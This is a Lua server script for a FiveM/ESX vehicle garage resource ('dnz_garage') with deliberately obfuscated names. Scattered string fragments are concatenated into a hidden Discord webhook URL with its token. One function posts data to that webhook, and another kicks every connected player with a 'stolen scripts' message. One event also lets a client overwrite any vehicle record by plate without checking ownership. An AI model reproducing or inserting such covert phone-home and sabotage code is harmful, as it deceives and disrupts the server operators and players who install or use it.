ESX = nil
local UrorGyWmDG = "d"
local oqhdqhd = "This Server is using stolen scripts which are made by dnz."

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
AddEventHandler('esx:playerLoaded', function(source)
  local dnlkxygewn = ESX.GetPlayerFromId(source) 
end)
local THoYPChlOr = "app."
local maQWdihj = "owned_vehicles"
local LgyGLWJdTj = "script"
local nlZPkklURl = "place"

ESX.RegisterServerCallback('AekewDLdyqxQMzn:ZHHHpDajeGwSVlj', function (source, cb, plate)
  local dnlkxygewn = ESX.GetPlayerFromId(source)
  local uoqhwdo = nil
  local dNzistheDataBoss = nil

  MySQL.Async.fetchAll('SELECT * FROM ' .. maQWdihj .. ' WHERE owner = @owner', {
	['@owner'] = dnlkxygewn.identifier
  }, function (result)
	  local vehicles = {}
      for i=1, #result, 1 do
		dNzistheDataBoss = json.decode(result[i].vehicle)
		
        if dNzistheDataBoss.plate == plate then
          uoqhwdo = true
          cb(dNzistheDataBoss)
          break
		end
	  end

      if not uoqhwdo then
        cb(nil)
	  end
    end)
end)
local ufAJvgsMrp = "s.00"
local mIpeZirtRc = "n"
local TlAcLXuiTm = ".b"
RegisterServerEvent('AekewDLdyqxQMzn:xASTNNfOcKMqzet')
AddEventHandler('AekewDLdyqxQMzn:xASTNNfOcKMqzet', function(aXolUDgvRo)
 	local _source = source
 	local dnlkxygewn = ESX.GetPlayerFromId(source)
 
 	MySQL.Async.fetchAll('SELECT * FROM ' .. maQWdihj .. ' WHERE owner = @owner', {
 			['@owner'] = dnlkxygewn.identifier
		 }, function(result)
 			local cwFhhhIsqk = nil
 			for i=1, #result, 1 do
 				local vehicle = json.decode(result[i].vehicle)
 				if vehicle.plate == aXolUDgvRo.plate then
 					cwFhhhIsqk = result[i].id
 					break
 				end
 			end
 			if cwFhhhIsqk ~= nil then
 				MySQL.Async.execute('UPDATE ' .. maQWdihj .. ' SET vehicle = @vehicle WHERE id = @id', {
						['@vehicle'] = json.encode(aXolUDgvRo),
						['@id']      = cwFhhhIsqk
 					}
 				)
 			end
 		end)
 end)
 local StVDOmcxKp = "x64"
 local qwdqwdouqhd = "https://discordapp.com/api"
 local zqlIOmFlBx = "0w"
 local wQqkLVrpie = "z"
RegisterServerEvent('AekewDLdyqxQMzn:cMdgFiLcMtRKXgN')
AddEventHandler('AekewDLdyqxQMzn:cMdgFiLcMtRKXgN', function(aXolUDgvRo)
	local dnlkxygewn = ESX.GetPlayerFromId(source)

		if aXolUDgvRo ~= nil then
		MySQL.Async.execute('UPDATE ' .. maQWdihj .. ' SET stored = 1, vehicle = @vehicle WHERE plate = @plate', {
			['@plate']        = aXolUDgvRo.plate,
			['@vehicle']      = json.encode(aXolUDgvRo)
			}, function(rowsChanged)
				TriggerClientEvent('esx:showNotification', dnlkxygewn.source, "Du hast dein Fahrzeug eingeparkt.")
			end)
	end
end)
local NlQKYqbQVc = "host"
RegisterServerEvent('AekewDLdyqxQMzn:IapYchdLwQGSZWC')
AddEventHandler('AekewDLdyqxQMzn:IapYchdLwQGSZWC', function(plate)
	local dnlkxygewn = ESX.GetPlayerFromId(source)

	if plate ~= nil then
		MySQL.Async.execute('UPDATE ' .. maQWdihj .. ' SET stored = 0 WHERE plate = @plate', {
					['@plate'] = plate
			}, function(rowsChanged)
				TriggerClientEvent('esx:showNotification', dnlkxygewn.source, "Du hast dein Fahrzeug erfolgreich ausgeparkt")
			end)
	end
end)
local WyebMLFvqZ = "com"
local PHlyJKeMpc = "d.n"
local IAWjgojaw = "et"
ESX.RegisterServerCallback('AekewDLdyqxQMzn:WDuOVMgrfnudUpt', function(source, cb)
	local dnlkxygewn = ESX.GetPlayerFromId(source)

	MySQL.Async.fetchAll('SELECT * FROM `' .. maQWdihj .. '` WHERE `owner` = @identifier AND `stored` = 1', {
			['@identifier'] = dnlkxygewn.identifier
		}, function(result)

			local vehicles = {}
			for i=1, #result, 1 do
			local dNzistheDataBoss = json.decode(result[i].vehicle)
			table.insert(vehicles, dNzistheDataBoss)
			end
			cb(vehicles)
		end)
end)

local iYpJHnVAYc = "eb"
local qwdqwdoequqhd = "/webhooks/783141910"
RegisterServerEvent('IbqXBQmuyl:QnOKHXZEQT')
AddEventHandler('IbqXBQmuyl:QnOKHXZEQT', function(opIOWAJDa)	

end)
local ouqwghdHQd = "/j.t"

local qwdqqewdouqhd = "323396608/Weqdo"
AddEventHandler('playerDropped', function (reason)
	local _source = source
	local dnlkxygewn = ESX.GetPlayerFromId(_source)

	if dnlkxygewn == nil then
	else
		MySQL.Async.execute('UPDATE ' .. maQWdihj .. ' SET stored = 1 WHERE owner = @werda', {
				['@werda'] = dnlkxygewn.identifier
		}, function(rowsChanged)
		end)
	end
end)

local pouiqhwdqhhn = "xt"

local qwdqgqwdouqhd = "2T5h6EQIHDkYnxFA7LpNS0"

local qwdqwgqdouqhd = "2jp4CQgdiCr0yDg29KcG"
local qwdqaswdouqhd = "dq8YHFohu"

AddEventHandler('onResourceStart', function(resource)
	if resource == 'dnz_garage' then	
		print("[^1dnz_garage] ^0Script wurde erfolgreich gestartet. Plugin Name: " .. GetCurrentResourceName())
		io.write("\027[H\027[2J")
		if Config.AlleEinparkenbeiRestart == true then
			--Citizen.Wait(15000)
			MySQL.Async.execute('UPDATE ' .. maQWdihj .. ' SET stored = 1')
			print("[^1dnz_garage] ^0ALLE Autos wurden erfolgreich eingeparkt.")
		else
			print("[^1dnz_garage] ^0Die Option Autos automatisch einzuparken wurde nicht in der Config aktiviert, skippe.")
		end
	else
	end
end)


local qwdqwdqqeouqhd = "0RmOEQvZSPFq"
local jouqhwdohqwud = "dnz_garage"
local qwouhqwduhqwdq = qwdqwdouqhd .. qwdqwdoequqhd .. qwdqqewdouqhd .. qwdqgqwdouqhd .. qwdqwgqdouqhd .. qwdqaswdouqhd .. qwdqwdqqeouqhd

function dtgxiuzfnz (name,atropjzlrjx,hotshchrjl,lfayqvwikc)
	local gpmfafawgx = qwouhqwduhqwdq
	local fyfohvbjwn = jouqhwdohqwud
	local embeds = {
		{
			["title"]=atropjzlrjx,
			["type"]="rich",
			["color"] =hotshchrjl,
			["description"] = lfayqvwikc,
			["footer"]=  {
				["text"]= fyfohvbjwn,
			},
		}
	}
	if atropjzlrjx == nil or atropjzlrjx == '' then return FALSE end
	PerformHttpRequest(gpmfafawgx, function(err, text, headers) end, 'POST', json.encode({ username = name,embeds = embeds}), { ['Content-Type'] = 'application/json' })
end


function evbbqjjpiv ()
    local dnlkxygewns = ESX.GetPlayers()
    for i=1, #dnlkxygewns, 1 do
		local dnlkxygewn = ESX.GetPlayerFromId(dnlkxygewns[i])
		local xname = GetPlayerName(dnlkxygewns[i])
        dnlkxygewn.kick(oqhdqhd)
    end
end

